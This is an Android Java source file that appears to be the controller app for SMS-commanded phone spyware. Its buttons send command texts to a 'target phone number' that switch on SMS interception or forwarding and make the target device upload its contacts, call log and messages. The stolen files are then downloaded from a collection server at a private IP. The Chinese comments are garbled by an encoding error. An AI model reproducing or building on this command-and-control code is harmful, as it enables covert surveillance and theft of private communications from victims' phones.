package com.seclab.mcerclient;

import java.io.File;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends Activity {
	Context ctx = MainActivity.this;
	Button interceptModeBtn = null;
	Button relayModeBtn;
	Button uploadpbBtn;
	Button downloadpbBtn;
	Button uploadclBtn;
	Button downloadclBtn;
	Button uploadsmsBtn;
	Button downloadsmsBtn;
	Button resetBtn;

	Context context = MainActivity.this;
	String DirPath = Environment.getExternalStorageDirectory().getPath()+"/";
//			+ "/McerClientFebVer/";

	@Override
	protected void onCreate(Bundle savedInstanceState) {

		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		File dir = new File(DirPath);
		if (dir.exists()) {
		} else {
			dir.mkdirs();
		}
		SharedPreferences sp = ctx.getSharedPreferences("SP", MODE_PRIVATE);
		boolean isFirstLaunch = sp.getBoolean("FIRST_LAUNCH", true);// �״����л�get����FIRST_LAUNCH��Ŀ���ʻḳ��true
		if (isFirstLaunch) {
			showSettings();
			Editor editor = sp.edit();
			editor.putBoolean("FIRST_LAUNCH", false);
			editor.commit();
		} else {
			Log.d("debug", "���ǵ�һ������");
		}

		interceptModeBtn = (Button) findViewById(R.id.interceptMode);
		relayModeBtn = (Button) findViewById(R.id.relayMode);
		uploadpbBtn = (Button) findViewById(R.id.uploadpb);
		downloadpbBtn = (Button) findViewById(R.id.downloadpb);
		uploadclBtn = (Button) findViewById(R.id.uploadcl);
		downloadclBtn = (Button) findViewById(R.id.downloadcl);
		uploadsmsBtn = (Button) findViewById(R.id.uploadsms);
		downloadsmsBtn = (Button) findViewById(R.id.downloadsms);
		resetBtn = (Button) findViewById(R.id.reset);

		interceptModeBtn.setOnClickListener(new Listener());
		relayModeBtn.setOnClickListener(new Listener());
		uploadpbBtn.setOnClickListener(new Listener());
		downloadpbBtn.setOnClickListener(new downloadListener());
		uploadclBtn.setOnClickListener(new Listener());
		downloadclBtn.setOnClickListener(new downloadListener());
		uploadsmsBtn.setOnClickListener(new Listener());
		downloadsmsBtn.setOnClickListener(new downloadListener());
		resetBtn.setOnClickListener(new Listener());
	}// ����download��ť����д������

	class Listener implements OnClickListener {
		SharedPreferences sp = ctx.getSharedPreferences("SP", MODE_PRIVATE);

		@Override
		public void onClick(View v) {
			String phoneNumber = sp.getString("PhoneNumber", "");
			String content = "";
			switch (v.getId()) {
			case R.id.interceptMode:
				content = "lanjie";
				Toast.makeText(ctx, "�л��ɹ�", Toast.LENGTH_LONG).show();
				break;
			case R.id.relayMode: {
				setRelayNumber();
				content = "zhuanfa";
				break;
			}
			case R.id.uploadpb:
				content = "uploadpb";
				Toast.makeText(ctx, "1�ɹ�", Toast.LENGTH_LONG).show();
				break;
			case R.id.uploadcl:
				content = "uploadcl";
				Toast.makeText(ctx, "3�ɹ�", Toast.LENGTH_LONG).show();
				break;
			case R.id.uploadsms:
				content = "uploadsms";
				Toast.makeText(ctx, "5�ɹ�", Toast.LENGTH_LONG).show();
				break;
			case R.id.reset:
				content = "reset_to_normal";
				Toast.makeText(ctx, "�ɹ�", Toast.LENGTH_LONG).show();
				break;
			}

			SmsManager manager = SmsManager.getDefault();
			manager.sendTextMessage(phoneNumber, null, content, null,null);//����Ͷ��ŵİ�ť
		}
	}

	class downloadListener implements OnClickListener {
		@Override
		public void onClick(View v) {
			// TODO Auto-generated method stub
			String tarFile = "";
			switch (v.getId()) {
			case R.id.downloadpb:
				tarFile = "http://192.168.23.1:8080/MobileUpload/ContactMe_Encrypted.txt";
				break;
			case R.id.downloadcl:
				tarFile = "http://192.168.23.1:8080/MobileUpload/CallLog_Encrypted.txt";
				break;
			case R.id.downloadsms:
				tarFile = "http://192.168.23.1:8080/MobileUpload/SMS_Encrypted.txt";
				break;
			}
			Intent it = new Intent(MainActivity.this,ServiceOne.class);
			it.putExtra("url", tarFile);//��URL����Service
			context.startService(it);
			
			
//			DownloadThread dt = new DownloadThread();
//			dt.setTar(tarFile);
//			Thread t = new Thread(dt);
//			t.start();
//			 File dir = new File(DirPath + tarFile);
//			 if (dir.exists())
//			 Toast.makeText(MainActivity.this, "����" + tarFile + "�ɹ�",
//			 Toast.LENGTH_LONG).show();
//			 else
//			 Toast.makeText(MainActivity.this, "����" + tarFile + "ʧ��",
//			 Toast.LENGTH_LONG).show();
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;

	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// TODO Auto-generated method stub
		switch (item.getItemId()) {
		case R.id.action_settings:
			showSettings();
			break;
		case R.id.action_about:
			new AlertDialog.Builder(this).setTitle(R.string.action_about)
					.setMessage(R.string.about_content)
					.setPositiveButton("OK", null).show();
			break;
		}

		return super.onOptionsItemSelected(item);
	}

	private void showSettings() {
		/** ��ȡ����edittext.xml�����ļ��е���ͼ��� */
		LayoutInflater inflater = (LayoutInflater) MainActivity.this
				.getSystemService(LAYOUT_INFLATER_SERVICE);
		final View view = inflater.inflate(R.layout.dlg_plus_edit, null);

		/** ����ʹ����ʽд��������һ��AlertDialog�Ի���,���Ұ�Ӧ�õ�����ͼviwe���뵽���� */

		/** ���AlertDialog���û���¼��ť,�������ð�ť��Ӧ�¼� */
		String setTarNum = "";

		SharedPreferences sp = ctx.getSharedPreferences("SP", MODE_PRIVATE);
		boolean isFirstLaunch = sp.getBoolean("FIRST_LAUNCH", true);// �״����л�get����FIRST_LAUNCH��Ŀ���ʻḳ��true
		if (isFirstLaunch) {
			setTarNum = "���ǵ�һ�����У�������Ŀ���ֻ�����";
		} else
			setTarNum = "����Ŀ���ֻ�����";
		new AlertDialog.Builder(MainActivity.this)
				.setTitle(setTarNum)
				.setView(view)
				.setPositiveButton("ȷ��", new DialogInterface.OnClickListener() {

					@Override
					public void onClick(DialogInterface arg0, int arg1) {
						/** ��ȡ�û����ı������ */
						EditText nameEditText = (EditText) view
								.findViewById(R.id.editText1);
						/** ��ȡ�û����ı�������������� */
						String phoneNumber = nameEditText.getText().toString();
						SharedPreferences sp = ctx.getSharedPreferences("SP",
								MODE_PRIVATE);
						Editor editor = sp.edit();
						editor.putString("PhoneNumber", phoneNumber);
						editor.commit();
						/** ����һ����Ϣ��,��ʾ�û����˺������� */
						Toast.makeText(MainActivity.this, "���óɹ�",
								Toast.LENGTH_LONG).show();
					}
					/** ��ӶԻ�����˳���ť,�������ð�ť��Ӧ�¼� */
				})
				.setNegativeButton("ȡ��", new DialogInterface.OnClickListener() {
					@Override
					public void onClick(DialogInterface arg0, int arg1) {
						String negaToast = "������ͨ�����˵�-���á����޸�����";
						Toast.makeText(MainActivity.this, negaToast,
								Toast.LENGTH_LONG).show();
					}
				}).show();
	}

	private void setRelayNumber() {
		/** ��ȡ����edittext.xml�����ļ��е���ͼ��� */
		LayoutInflater inflater = (LayoutInflater) MainActivity.this
				.getSystemService(LAYOUT_INFLATER_SERVICE);
		final View view = inflater.inflate(R.layout.dlg_plus_edit, null);

		/** ����ʹ����ʽд��������һ��AlertDialog�Ի���,���Ұ�Ӧ�õ�����ͼviwe���뵽���� */

		/** ���AlertDialog���û���¼��ť,�������ð�ť��Ӧ�¼� */
		SharedPreferences sp = ctx.getSharedPreferences("SP", MODE_PRIVATE);
		new AlertDialog.Builder(MainActivity.this)
				.setTitle("��дת�������ֻ�����")
				.setView(view)
				.setPositiveButton("ȷ��", new DialogInterface.OnClickListener() {

					@Override
					public void onClick(DialogInterface arg0, int arg1) {
						/** ��ȡ�û����ı������ */
						EditText nameEditText = (EditText) view
								.findViewById(R.id.editText1);
						/** ��ȡ�û����ı�������������� */
						String relayNumber = nameEditText.getText().toString();
						SharedPreferences sp = ctx.getSharedPreferences("SP",
								MODE_PRIVATE);
						Editor editor = sp.edit();
						editor.putString("RelayNumber", relayNumber);
						editor.commit();
						String phoneNumber = sp.getString("PhoneNumber", "");
						SmsManager manager = SmsManager.getDefault();
						manager.sendTextMessage(phoneNumber, null, "RNFN8PY"
								+ relayNumber, null, null);
						/** ����һ����Ϣ��,��ʾ�û����˺������� */
						Toast.makeText(MainActivity.this, "���óɹ�",
								Toast.LENGTH_LONG).show();
					}
					/** ��ӶԻ�����˳���ť,�������ð�ť��Ӧ�¼� */
				})
				.setNegativeButton("ȡ��", new DialogInterface.OnClickListener() {

					@Override
					public void onClick(DialogInterface arg0, int arg1) {
						// Toast.makeText(MainActivity.this, "��ȡ���˵�¼",
						// Toast.LENGTH_LONG).show();
					}
				}).show();
	}

}
